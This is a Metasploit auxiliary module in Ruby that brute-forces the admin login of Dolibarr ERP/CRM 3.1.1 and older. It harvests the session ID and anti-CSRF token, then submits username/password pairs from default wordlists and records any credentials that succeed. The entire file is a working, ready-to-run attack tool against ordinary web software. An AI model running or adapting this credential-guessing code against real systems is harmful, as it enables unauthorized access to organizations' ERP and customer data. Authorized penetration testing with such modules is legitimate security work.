##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::AuthBrute

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Dolibarr ERP & CRM 3 Login Utility',
			'Description'    => %q{
				This module attempts to authenticate to a Dolibarr ERP/CRM's admin web interface,
				and should only work against version 3.1.1 or older, because these versions do not
				have any default protections against bruteforcing.
			},
			'Author'         => [ 'sinn3r' ],
			'License'        => MSF_LICENSE
		))

		register_options(
			[
				OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "http_default_userpass.txt") ]),
				OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "http_default_users.txt") ]),
				OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "http_default_pass.txt") ]),
				OptString.new('TARGETURI', [true, 'The URI path to dolibarr', '/dolibarr/'])
			], self.class)
	end


	def get_sid_token
		res = send_request_raw({
			'method' => 'GET',
			'uri'    => normalize_uri(@uri.path)
		})

		return [nil, nil] if not (res and res.headers['Set-Cookie'])

		# Get the session ID from the cookie
		m = res.headers['Set-Cookie'].match(/(DOLSESSID_.+);/)
		id = (m.nil?) ? nil : m[1]

		# Get the token from the decompressed HTTP body response
		m = res.body.match(/type="hidden" name="token" value="(.+)"/)
		token = (m.nil?) ? nil : m[1]

		return id, token
	end

	def do_login(user, pass)
		#
		# Get a new session ID/token.  That way if we get a successful login,
		# we won't get a false positive due to reusing the same sid/token.
		#
		sid, token = get_sid_token
		if sid.nil? or token.nil?
			print_error("#{@peer} - Unable to obtain session ID or token, cannot continue")
			return :abort
		else
			vprint_status("#{@peer} - Using sessiond ID: #{sid}")
			vprint_status("#{@peer} - Using token: #{token}")
		end

		begin
			res = send_request_cgi({
				'method'   => 'POST',
				'uri'      => normalize_uri("#{@uri.path}index.php"),
				'cookie'   => sid,
				'vars_post' => {
					'token'         => token,
					'loginfunction' => 'loginfunction',
					'tz'            => '-6',
					'dst'           => '1',
					'screenwidth'   => '1093',
					'screenheight'  => '842',
					'username'      => user,
					'password'      => pass
				}
			})
		rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
			vprint_error("#{@peer} - Service failed to respond")
			return :abort
		end

		if res.nil?
			print_error("#{@peer} - Connection timed out")
			return :abort
		end

		location = res.headers['Location']
		if res and res.headers and (location = res.headers['Location']) and location =~ /admin\//
			print_good("#{@peer} - Successful login: \"#{user}:#{pass}\"")
			report_auth_info({
				:host        => rhost,
				:port        => rport,
				:sname       => (ssl ? 'https' : 'http'),
				:user        => user,
				:pass        => pass,
				:proof       => location,
				:source_type => 'user_supplied'
			})
			return :next_user
		else
			vprint_error("#{@peer} - Bad login: \"#{user}:#{pass}\"")
			return
		end
	end

	def run
		@uri = target_uri.path
		@uri.path << "/" if @uri.path[-1, 1] != "/"
		@peer = "#{rhost}:#{rport}"

		each_user_pass { |user, pass|
			vprint_status("#{@peer} - Trying \"#{user}:#{pass}\"")
			do_login(user, pass)
		}
	end
end
